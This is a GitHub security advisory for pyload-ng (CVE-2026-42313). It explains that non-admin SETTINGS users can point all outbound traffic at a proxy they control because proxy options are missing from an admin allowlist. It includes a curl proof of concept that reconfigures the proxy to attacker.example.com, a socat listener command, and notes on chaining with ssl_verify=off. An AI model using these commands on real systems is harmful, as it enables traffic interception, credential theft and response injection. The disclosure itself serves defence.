# [H] pyload-ng: non-admin SETTINGS users can redirect all outbound traffic through an attacker-controlled proxy via unrestricted `proxy.*` config (incomplete fix for CVE-2026-33509 / -35463 / -35464 / -35586)

## Summary
Severity: High
Advisory: GHSA-pg67-9wjv-mr85
CVE: CVE-2026-42313
CWE: CWE-441, CWE-863, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-pg67-9wjv-mr85
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev100

## Details
### Summary

The `set_config_value()` API method (`@permission(Perms.SETTINGS)`) in `src/pyload/core/api/__init__.py` gates security-sensitive options behind a hand-maintained allowlist `ADMIN_ONLY_CORE_OPTIONS`. The allowlist contains `("proxy", "username")` and `("proxy", "password")` — which protect the proxy credentials — but it does **not** include `("proxy", "enabled")`, `("proxy", "host")`, `("proxy", "port")`, or `("proxy", "type")`. Any authenticated user with the non-admin `SETTINGS` permission can enable proxying and point pyload at any host they control. From that point, every outbound download, captcha fetch, update check, and plugin HTTP call is transparently routed through the attacker.

Gating only the proxy credentials is ineffective: the attacker is the proxy endpoint, so they do not need pyload's proxy-auth secret. `proxy.username` / `proxy.password` were designed so an admin could authenticate to a trusted corporate proxy; they do not help when the non-admin attacker is free to choose the proxy itself.

This is a direct continuation of the fix family CVE-2026-33509 / CVE-2026-35463 / CVE-2026-35464 / CVE-2026-35586, each of which patched a different missed option in the same allowlist. CVE-2026-35586 in particular bundled three related SSL-cert options into one advisory on the same rationale applied here — the four `proxy.*` fields are jointly required to weaponize the miss and are patched together.

### Details

**Writer** — `src/pyload/core/api/__init__.py`, `set_config_value()` (around lines 215–290). The allowlist:

```python
ADMIN_ONLY_CORE_OPTIONS = {
    ("general", "storage_folder"),
    ("log", "syslog_host"), ("log", "syslog_port"),
    ("proxy", "password"), ("proxy", "username"),   # <-- credentials gated
    ("reconnect", "script"),
    ("webui", "host"),
    ("webui", "ssl_certfile"), ("webui", "ssl_keyfile"), ("webui", "ssl_certchain"),
    ("webui", "use_ssl"),
}
```

`("proxy", "enabled")`, `("proxy", "host")`, `("proxy", "port")`, `("proxy", "type")` are absent.

**Reader** — `src/pyload/core/network/request_factory.py:82-100`:

```python
def get_proxies(self):
    if not self.pyload.config.get("proxy", "enabled"):
        return {}
    proxy_type     = self.pyload.config.get("proxy", "type")
    proxy_host     = self.pyload.config.get("proxy", "host")
    proxy_port     = self.pyload.config.get("proxy", "port")
    proxy_username = self.pyload.config.get("proxy", "username") or None
    proxy_password = self.pyload.config.get("proxy", "password") or None
    return {"type": proxy_type, ..., "host": proxy_host, "port": proxy_port, ...}
```

**Sink** — `src/pyload/core/network/http/http_request.py` (around lines 211–230) passes the dict to pycurl via `PROXY` / `PROXYPORT` / `PROXYTYPE` options. `get_proxies()` is called every time a new pycurl handle is constructed, so the new proxy config takes effect on the next outbound request — no restart required.

### PoC

Authenticated as any user with `Perms.SETTINGS` (non-admin role):

```bash
# 1) Log in as the SETTINGS (non-admin) user.
curl -c cookies.txt -X POST http://pyload.example:8000/api/login \
    -d 'username=settings_user&password=<password>'

# 2) Redirect all outbound traffic through attacker.example.com:8080.
for kv in \
    'category=proxy&option=enabled&value=True' \
    'category=proxy&option=host&value=attacker.example.com' \
    'category=proxy&option=port&value=8080' \
    'category=proxy&option=type&value=http' ; do
  curl -b cookies.txt -X POST http://pyload.example:8000/api/setConfigValue \
      -d "$kv&section=core"
done

# 3) Enqueue any download (or wait for any periodic update / captcha
#    fetch). The attacker's server receives the full request — URL,
#    query string (often carrying auth tokens on download sites),
#    headers, cookies — and can inject an arbitrary response body.
```

Verification: run a raw HTTP listener on attacker.example.com:8080 (e.g. `socat -v TCP-LISTEN:8080,fork,reuseaddr -`), trigger any pyload download, and observe the full request on the listener.

### Impact

- **Who**: any authenticated user whose role was granted `Perms.SETTINGS`. Multi-user pyload deployments that delegate settings administration to non-admins are the primary blast radius.
- **What**:
    1. **Full interception of all outbound HTTP traffic**: URLs (including embedded tokens), headers, cookies (download-site session IDs), request bodies, and response bodies flow through the attacker.
    2. **Credential theft** from any download-site auth cookies or bearer tokens that affected plugins send.
    3. **Arbitrary response injection** — poisoned archive files into the extractor pipeline; poisoned HTML into anticaptcha solvers; arbitrary content into the update checker.
    4. **Chains with the sibling `ssl_verify` advisory**: if the attacker additionally sets `general.ssl_verify=off` (same authz family), the MitM works for HTTPS too, with forged certs accepted for any hostname. Both settings together let the attacker fully weaponize what `set_config_value` already permits to a SETTINGS user.
- **Why gating the credentials alone is insufficient**: already covered in the summary — the attacker owns the proxy endpoint, so they do not need pyload's proxy-auth creds.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-pg67-9wjv-mr85
- https://nvd.nist.gov/vuln/detail/CVE-2026-42313
- https://github.com/advisories/GHSA-4744-96p5-mp2j
- https://github.com/advisories/GHSA-ppvx-rwh9-7rj7
- https://github.com/advisories/GHSA-r7mc-x6x7-cqxx
- https://github.com/advisories/GHSA-w48f-wwwf-f5fr
- https://github.com/pyload/pyload
- https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-127.yaml
